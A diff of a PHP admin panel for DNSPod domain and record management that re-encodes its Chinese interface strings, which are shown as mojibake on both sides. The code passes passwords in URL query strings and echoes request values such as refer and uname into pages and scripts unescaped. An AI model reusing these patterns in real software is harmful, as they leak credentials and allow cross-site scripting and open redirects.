@@ -9774,7 +11402,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 $dnspodu = trim(request("uname"));
 $dnspodp = trim(request("pwd"));
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -9799,11 +11427,11 @@ elseif ($stract == "Domain.List"){
         if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                 If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                         if (trim(request("checkcode")) != ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                 break;
                         }       
                         elseif (trim(request("checkcode")) == ""){
-                                AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                 break;
                         }
                 }       
@@ -9848,11 +11476,11 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 elseif ($stract == "Domain.Create" && trim($_POST["domain"]) != ""){
         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                 if (trim(request("checkcode")) != ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                         break;
                 }       
                 elseif (trim(request("checkcode")) == ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                         break;
                 }               
         }
@@ -9863,11 +11491,11 @@ elseif ($stract == "Domain.Create" && trim($_POST["domain"]) != ""){
 elseif ($stract == "Record.Create" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != ""){
         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                 if (trim(request("checkcode")) != ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                         break;
                 }       
                 elseif (trim(request("checkcode")) == ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                         break;
                 }               
         }
@@ -9878,11 +11506,11 @@ elseif ($stract == "Record.Create" && trim($_POST["record_type"]) != "" && trim(
 elseif ($stract == "Record.Modify" && trim($_POST["sub_domain"]) != "" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != "" && trim($_POST["ttl"]) != ""){
         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                 if (trim(request("checkcode")) != ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                         break;
                 }       
                 elseif (trim(request("checkcode")) == ""){
-                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                         break;
                 }               
         }
@@ -9921,9 +11549,9 @@ function changeimg()
         <tr class="tdtbg" height="35">
                 <td align="center">
                         <form action="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.List");?>" method="post" name="dnspod">
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="<?php  echo encodeuri(trim(request("pwd")));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> style="height:20px;font-size:11px" maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" style="height:14px;" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="<?php  echo encodeuri(trim(request("pwd")));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> style="height:20px;font-size:11px" maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" style="height:14px;" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
@@ -9961,13 +11589,13 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÓòÃûÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„åŸŸåå—?')) return;
  document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.dnspod.submit();
 }
 function doitem(act)
 {
- if(!confirm('È·¶¨¸ü¸ÄÑ¡ÖĞµÄÓòÃû×´Ì¬Âğ?')) return;
+ if(!confirm('ç¡®å®šæ›´æ”¹é€‰ä¸­çš„åŸŸåçŠ¶æ€å—?')) return;
  document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&status=' + act;
  document.dnspod.submit();
 }
@@ -9978,12 +11606,12 @@ function doitem(act)
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3"> ²é Ñ¯ ½á ¹û : ¹² <?php echo $totalitem;?> Ìõ </td>
+                <td align="center" colspan="3"> æŸ¥ è¯¢ ç»“ æœ : å…± <?php echo $totalitem;?> æ¡ </td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ÓÃ»§</a> - <?php echo $dnspoduname;?> - <?php if (trim(request("type"))!="mine" && trim(request("type"))!=""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine";?>" style="color:#444444">Mine</a><?php }elseif (trim(request("type"))=="mine" || trim(request("type"))==""){echo "Mine";}?>/<?php if (trim(request("type"))!="share" || trim(request("type"))==""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=share";?>" style="color:#444444">Shared</a><?php }elseif (trim(request('type')=='share')){echo "Shared";}?> <?php  if (trim($_SESSION["dnspod"]["uname"]) != "" && trim($_SESSION["dnspod"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&logout=1";?>" target="_self">ÍË³ö</a><?php  } ?>] </td>
+                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ç”¨æˆ·</a> - <?php echo $dnspoduname;?> - <?php if (trim(request("type"))!="mine" && trim(request("type"))!=""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine";?>" style="color:#444444">Mine</a><?php }elseif (trim(request("type"))=="mine" || trim(request("type"))==""){echo "Mine";}?>/<?php if (trim(request("type"))!="share" || trim(request("type"))==""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=share";?>" style="color:#444444">Shared</a><?php }elseif (trim(request('type')=='share')){echo "Shared";}?> <?php  if (trim($_SESSION["dnspod"]["uname"]) != "" && trim($_SESSION["dnspod"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&logout=1";?>" target="_self">é€€å‡º</a><?php  } ?>] </td>
         </tr>
 </table>        
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
@@ -10001,19 +11629,19 @@ function doitem(act)
                         <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                 </td>   
                 <td align="center" width=25%>
-                        ÓòÃûÖµ
+                        åŸŸåå€¼
                 </td>
                 <td align="center" width=10%>
-                        µÈ¼¶
+                        ç­‰çº§
                 </td> 
                 <td align="center" width=10%>
-                        ¼ÇÂ¼Êı
+                        è®°å½•æ•°
                 </td>
                 <td align="center" width=25%>
-                        ¹²ÏíÀ´Ô´
+                        å…±äº«æ¥æº
                 </td>
                 <td align="center" width=30%>
-                        <a style="color:#444444" href="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&skin=<?php  echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php  echo encodeuri(trim(request("pwd")));?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page;?>">Ìí¼Ó</a> ËÑË÷ <a style="color:#444444" href="javascript:delitem();">É¾³ı</a> <a style="color:#444444" href="javascript:doitem('enable');">Æô</a>/<a style="color:#444444" href="javascript:doitem('disable');">Í£</a>
+                        <a style="color:#444444" href="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&skin=<?php  echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php  echo encodeuri(trim(request("pwd")));?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page;?>">æ·»åŠ </a> æœç´¢ <a style="color:#444444" href="javascript:delitem();">åˆ é™¤</a> <a style="color:#444444" href="javascript:doitem('enable');">å¯</a>/<a style="color:#444444" href="javascript:doitem('disable');">åœ</a>
                 </td> 
         </tr>   
                 <?php 
@@ -10047,7 +11675,7 @@ function doitem(act)
                 <td align="center">
                         <?php echo $domainshared;?>
                 </td>
-                <td align="center"><a style="color:#444444" href="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>&domainid=<?php echo $domainid;?>&topdomain=<?php echo $domain;?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri($domaingrade)?>">Ìí¼Ó</a> <a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri($domainid)."&type=".encodeuri($type)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">É¾³ı</a> <?php if ($domainstatus == 'enable' || $domainstatus == '1'){?><a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">Í£ÓÃ</a><?php }else{?><a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">ÆôÓÃ</a><?php }?> µ¼Èë µ¼³ö</td>
+                <td align="center"><a style="color:#444444" href="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>&domainid=<?php echo $domainid;?>&topdomain=<?php echo $domain;?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri($domaingrade)?>">æ·»åŠ </a> <a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri($domainid)."&type=".encodeuri($type)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">åˆ é™¤</a> <?php if ($domainstatus == 'enable' || $domainstatus == '1'){?><a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">åœç”¨</a><?php }else{?><a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">å¯ç”¨</a><?php }?> å¯¼å…¥ å¯¼å‡º</td>
         </tr>   
                 <?php 
                 }
@@ -10057,13 +11685,13 @@ function doitem(act)
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&type=".trim(request("type"))."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&type=".trim(request("type"))."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&type=".trim(request("type"))."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&type=".trim(request("type"))."'>ä¸‹ä¸€é¡µ</a> ";
                 				
                 				?>
                 				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
@@ -10077,7 +11705,7 @@ function doitem(act)
         </tr>   
 </table>
 <?php 
-                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&type=".trim(request("type"))."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&type=".trim(request("type"))."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
                 // action - Domain.List start
         case "Domain.Create": // action - Domain.Create start
@@ -10085,7 +11713,7 @@ function doitem(act)
 ?>
 <table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ÓÃ»§</a> - <?php echo $dnspoduname;?> ] </td>
+                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ç”¨æˆ·</a> - <?php echo $dnspoduname;?> ] </td>
         </tr>
 </table>
 
@@ -10099,8 +11727,8 @@ function changeimg()
         <tr class="tdtbg" height="35">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&pagesize=<?php  echo encodeuri($pagesize)."&page=".trim(request("page"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
-                        &nbspÓòÃû£º<input type="text" class="text" name="domain" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÑéÖ¤Âë£º<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspåŸŸåï¼š<input type="text" class="text" name="domain" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspéªŒè¯ç ï¼š<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                         <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER["HTTP_REFERER"]))?>"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
@@ -10116,15 +11744,15 @@ function changeimg()
                         if ($dnspoddomaincreate['code'] == "1"){
                         ?>
 <script language=javascript>
-        alert("ÇëÊÖ¶¯¸ü¸Ä \n   <?php  echo $dnspoddomaincreate['punycode'];?> \n NS¼ÇÂ¼Îª: \n f1g1ns1.dnspod.net  \n f1g1ns2.dnspod.net ");
+        alert("è¯·æ‰‹åŠ¨æ›´æ”¹ \n   <?php  echo $dnspoddomaincreate['punycode'];?> \n NSè®°å½•ä¸º: \n f1g1ns1.dnspod.net  \n f1g1ns2.dnspod.net ");
 </script>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃûÌí¼Ó³É¹¦£¡ÓòÃûID£º<?php  echo $dnspoddomaincreate['id'];?> Êµ¼ÊÓòÃû£º<?php echo $dnspoddomaincreate['punycode']." <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸåæ·»åŠ æˆåŠŸï¼åŸŸåIDï¼š<?php  echo $dnspoddomaincreate['id'];?> å®é™…åŸŸåï¼š<?php echo $dnspoddomaincreate['punycode']." <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
 </table>                        
@@ -10135,11 +11763,11 @@ function changeimg()
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃûÌí¼ÓÊ§°Ü£¡Ô­Òò£º<?php echo $dnspoddomaincreate['message']." <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸåæ·»åŠ å¤±è´¥ï¼åŸå› ï¼š<?php echo $dnspoddomaincreate['message']." <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
 </table>                        
@@ -10148,7 +11776,7 @@ function changeimg()
                         }
                 }       
                 else{ 
-                        AlertBack ("ÓòÃû¸ñÊ½´íÎó£¡" , 2);
+                        AlertBack ("åŸŸåæ ¼å¼é”™è¯¯ï¼" , 2);
                 }
                 break;
         case "Domain.Remove": // action - main start
@@ -10160,13 +11788,13 @@ function changeimg()
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>È·ÈÏ</a>
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>È¡Ïû</a>
+											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>ç¡®è®¤</a>
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>å–æ¶ˆ</a>
                 </td>
         </tr>  
 </table> 
@@ -10179,11 +11807,11 @@ function changeimg()
         <script language="vbscript">
         <!--
                 Dim delok
-                delok = MsgBox("ÊÇ·ñÉ¾³ı¸ÃÏà²á£¡", vbOKCancel, "X3193")
+                delok = MsgBox("æ˜¯å¦åˆ é™¤è¯¥ç›¸å†Œï¼", vbOKCancel, "X3193")
                 If delok = vbOK Or delok = vbYes Then
                         window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                 else    
-                        MsgBox("¸ÃÏà²áÉ¾³ıÈ¡Ïû£¡")
+                        MsgBox("è¯¥ç›¸å†Œåˆ é™¤å–æ¶ˆï¼")
                         window.location.href="<?php echo trim(request("refer"))?>"
                 End If
         //-->
@@ -10194,7 +11822,7 @@ function changeimg()
 
                 }
                 if (trim(request("domain_id")) == "" && count($_POST) == 0){
-                        AlertBack ("Î´Ñ¡ÔñÈÎºÎÓòÃû£¡" , 2);
+                        AlertBack ("æœªé€‰æ‹©ä»»ä½•åŸŸåï¼" , 2);
                         break;
                 }
                 $dnspod = new dnspod_class();
@@ -10205,11 +11833,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃûÉ¾³ı³É¹¦£¡<?php  echo $timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸååˆ é™¤æˆåŠŸï¼<?php  echo $timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -10226,11 +11854,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃûÉ¾³ıÊ§°Ü£¡Ô­Òò£º <?php echo $dnspoddomainremove['message'];?><?php  echo " <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸååˆ é™¤å¤±è´¥ï¼åŸå› ï¼š <?php echo $dnspoddomainremove['message'];?><?php  echo " <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -10247,11 +11875,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃûÉ¾³ıÊ§°Ü£¡Ô­Òò£º¡°Î´Ñ¡ÔñÈÎºÎÌõÄ¿£¡¡±<?php  echo " <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸååˆ é™¤å¤±è´¥ï¼åŸå› ï¼šâ€œæœªé€‰æ‹©ä»»ä½•æ¡ç›®ï¼â€<?php  echo " <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -10364,7 +11992,7 @@ function changeimg()
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($xmlstr);      
                         $objList = $objXml->getElementsByTagName("item");                       
                         //echo $objList->item(0)->getElementsByTagName("id")->item(0)->nodeValue;
@@ -10429,7 +12057,7 @@ function changeimg()
                         }                               
                 }
                 elseif (trim(request("domain_id")) == "" && count($_POST) == 0){
-                        AlertBack ("Î´Ñ¡ÔñÈÎºÎÓòÃû£¡" , 1);
+                        AlertBack ("æœªé€‰æ‹©ä»»ä½•åŸŸåï¼" , 1);
                         break;
                 }
 
@@ -10443,11 +12071,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
